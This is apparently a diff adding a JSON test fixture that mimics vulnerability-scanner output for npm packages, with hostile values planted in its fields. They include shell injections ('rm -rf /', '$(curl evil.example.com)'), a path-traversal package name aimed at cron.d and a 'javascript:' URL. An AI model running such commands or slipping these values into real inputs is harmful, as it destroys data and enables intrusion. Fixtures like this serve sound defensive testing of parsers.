@@ -1,0 +1,37 @@
+{
+  "results": [
+    {
+      "packages": [
+        {
+          "package": {"name": "left-pad\"; rm -rf / #", "version": "1.0.0", "ecosystem": "npm"},
+          "vulnerabilities": [{"id": "GHSA-evil-1", "aliases": ["CVE-2026-1111"]}]
+        },
+        {
+          "package": {"name": "../../../etc/cron.d/evil", "version": "1.0.0", "ecosystem": "npm"},
+          "vulnerabilities": [{"id": "GHSA-evil-2", "aliases": []}]
+        },
+        {
+          "package": {"name": "left-pad", "version": "1.0.0 $(curl evil.example.com)", "ecosystem": "npm"},
+          "vulnerabilities": [
+            {
+              "id": "GHSA-evil-3",
+              "aliases": ["CVE-2026-3333"],
+              "affected": [{"ranges": [{"type": "SEMVER", "events": [{"fixed": "2.0.0; rm -rf /"}]}]}]
+            }
+          ]
+        },
+        {
+          "package": {"name": "left-pad", "version": "1.0.0", "ecosystem": "npm"},
+          "vulnerabilities": [
+            {
+              "id": "GHSA-ok-1",
+              "aliases": ["CVE-2026-4444"],
+              "references": [{"url": "javascript:alert(1)"}],
+              "affected": [{"ranges": [{"type": "SEMVER", "events": [{"fixed": "1.0.1"}]}]}]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
